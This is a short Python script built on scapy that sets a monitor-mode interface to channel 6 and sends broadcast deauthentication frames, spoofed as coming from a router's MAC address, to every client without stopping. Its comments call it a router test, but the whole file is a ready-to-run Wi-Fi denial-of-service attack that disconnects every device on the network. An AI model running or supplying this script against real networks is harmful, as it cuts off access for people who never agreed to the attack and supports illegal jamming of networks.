from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
import os

# Configuration
# The MAC address of the Router you want to test
gateway_mac = "e8:94:f6:c4:97:3f" 
# The broadcast address targets everyone
target_mac = "ff:ff:ff:ff:ff:ff"   
# Your monitor mode interface
interface = "wlan0mon"            

# Ensure the wireless card is on the correct channel 
# (Change '6' to whatever channel your gateway is using)
os.system(f"iwconfig {interface} channel 6")

# Constructing the Broadcast Deauth Packet
# addr1 = Destination (Everyone)
# addr2 = Source (The Router)
# addr3 = BSSID (The Router)
packet = RadioTap()/Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)/Dot11Deauth(reason=7)

print(f"Broadcasting Deauth frames from Gateway: {gateway_mac} to ALL clients...")

# sendp sends packets at Layer 2
# count=0 means it will run infinitely until you press Ctrl+C
sendp(packet, iface=interface, count=0, inter=0.1, verbose=1)
